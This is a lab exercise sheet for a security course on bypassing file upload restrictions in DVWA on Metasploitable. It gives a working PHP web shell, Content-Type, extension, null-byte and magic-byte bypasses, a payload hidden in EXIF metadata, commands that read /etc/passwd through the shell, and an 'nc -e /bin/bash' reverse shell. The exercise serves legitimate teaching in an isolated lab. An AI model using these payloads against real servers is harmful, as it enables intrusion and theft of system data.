# 🔬 Lab Exercise 4: File Upload Bypass

> **Challenge:** Bypass file upload restrictions to upload malicious files
> **Where:** DVWA on Metasploitable + Burp Suite on Kali
> **Time:** ~45-55 minutes

---

## Exercise 4A: File Upload at Low Security — PHP Web Shell

**Target:** `http://192.168.56.20/dvwa/vulnerabilities/upload/`

> **Prerequisite:** DVWA security set to **Low**

```bash
# Step 1: Create a simple PHP web shell on Kali
echo '<?php echo "<pre>".shell_exec($_GET["cmd"])."</pre>"; ?>' > /tmp/shell.php

# Step 2: Upload it
# Go to http://192.168.56.20/dvwa/vulnerabilities/upload/
# Click Browse → select /tmp/shell.php
# Click Upload
# ✅ EXPECTED: "../../hackable/uploads/shell.php succesfully uploaded!"
# 📝 Note the upload path shown

# Step 3: Access your web shell
# Navigate to: http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=whoami
# ✅ EXPECTED: Server responds with "www-data" (the web server user)

# Step 4: Run more commands through the web shell
# Try these URLs:
# http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=id
# http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=uname -a
# http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=cat /etc/passwd
# http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=ls -la /var/www/
# 📝 Documment what info you gathered: ______________
```

---

## Exercise 4B: Extension Bypass at Medium Security

**Target:** DVWA File Upload at **Medium** security

```
Step 1: Change DVWA security to Medium
  - Go to http://192.168.56.20/dvwa/security.php → set to "Medium"

Step 2: Try uploading shell.php directly
  - Go to http://192.168.56.20/dvwa/vulnerabilities/upload/
  - Upload /tmp/shell.php
  📝 What error do you get? ______________
  📝 The server now checks the file type!

Step 3: Check what the server validates (View Source)
  - Click "View Source" on the DVWA page
  - 📝 What validation does Medium security use?
  - 📝 Does it check: extension? content-type? magic bytes?

Step 4: Bypass with Content-Type modification (Burp)
  - Turn Burp Intercept ON
  - Upload shell.php again
  - In Burp, find the Content-Type for the file:
    Content-Type: application/x-php
  - Change it to: Content-Type: image/jpeg
  - Forward the request
  ✅ EXPECTED: Upload succeeds! The server only checked Content-Type, not extension.

Step 5: Verify the shell works
  - Navigate to: http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=whoami
  ✅ EXPECTED: "www-data"
```

---

## Exercise 4C: Double Extension and Alternate Extension Bypass

```bash
# Step 1: Create files with different extensions
cp /tmp/shell.php /tmp/shell.php.jpg
cp /tmp/shell.php /tmp/shell.php5
cp /tmp/shell.php /tmp/shell.phtml
cp /tmp/shell.php /tmp/shell.pHp

# Step 2: Try uploading each one (DVWA at Medium security)
# For each file:
#   1. Upload via the form
#   2. If blocked, intercept with Burp and modify Content-Type to image/jpeg
#   3. Try to access the uploaded file
# 📝 Record results:
#   shell.php.jpg  → Uploaded? ___ Executes as PHP? ___
#   shell.php5     → Uploaded? ___ Executes as PHP? ___
#   shell.phtml    → Uploaded? ___ Executes as PHP? ___
#   shell.pHp      → Uploaded? ___ Executes as PHP? ___

# Step 3: Try null byte injection (older PHP versions)
# In Burp, change filename to: shell.php%00.jpg
# 📝 Did this bypass the check?
```

---

## Exercise 4D: Magic Bytes Bypass at High Security

**Target:** DVWA File Upload at **High** security

```bash
# Step 1: Change DVWA security to High
# Go to http://192.168.56.20/dvwa/security.php → set to "High"

# Step 2: Try a normal upload of shell.php
# 📝 What error do you get? ______________

# Step 3: View Source — what does High security check?
# 📝 Validation at High security: ______________
# (It likely checks extension AND file content/magic bytes)

# Step 4: Create a file with GIF magic bytes + PHP code
printf 'GIF89a\n<?php echo "<pre>".shell_exec($_GET["cmd"])."</pre>"; ?>' > /tmp/shell.gif.php

# Step 5: Try uploading with .jpg extension and magic bytes
printf '\xff\xd8\xff\xe0<?php echo "<pre>".shell_exec($_GET["cmd"])."</pre>"; ?>' > /tmp/shell.php.jpg

# Step 6: Embed PHP in a real image using exiftool
# First, copy a real image
cp /usr/share/pixmaps/kali-logo.png /tmp/payload.png
# Embed PHP in the metadata (EXIF comment)
exiftool -Comment='<?php echo shell_exec($_GET["cmd"]); ?>' /tmp/payload.png
# Rename with PHP extension
cp /tmp/payload.png /tmp/payload.php.png

# Step 7: Upload and test
# Try each crafted file
# Intercept with Burp to modify filename/content-type if needed
# 📝 Which technique bypassed High security?
```

---

## Exercise 4E: Upload and Execute Web Shell — Full Attack Chain

```bash
# Step 1: Set DVWA back to Low security for this exercise
# Upload shell.php as in Exercise 4A

# Step 2: Use the web shell to explore the server
# Run these commands via the web shell URL:

# System info
curl "http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=uname%20-a"

# List all users
curl "http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=cat%20/etc/passwd"

# Check running processes
curl "http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=ps%20aux"

# Network info
curl "http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=ifconfig"

# Check for other web apps
curl "http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=ls%20/var/www/"

# Step 3: Try a reverse shell (advanced)
# On Kali, start a listener:
nc -lvnp 5555

# Via the web shell, execute:
# http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=nc -e /bin/bash 192.168.56.10 5555
# Or URL-encoded:
curl "http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=nc%20-e%20/bin/bash%20192.168.56.10%205555"

# ✅ EXPECTED: You get a reverse shell connection on your Kali listener!
# 📝 You now have interactive shell access to the server

# Step 4: Clean up — remove your shells
curl "http://192.168.56.20/dvwa/hackable/uploads/shell.php?cmd=rm%20/var/www/dvwa/hackable/uploads/shell*"
```

---

## ✅ Completion Checklist

- [ ] Uploaded a PHP web shell at Low security and executed commands (4A)
- [ ] Bypassed Medium security with Content-Type modification in Burp (4B)
- [ ] Tested double extensions and alternate PHP extensions (4C)
- [ ] Created files with magic bytes to bypass content validation (4D)
- [ ] Executed full attack chain: upload → command execution → reverse shell (4E)

---

**Next:** [Challenge 23: CSRF Attack →](./05_lab_csrf_attack.md)
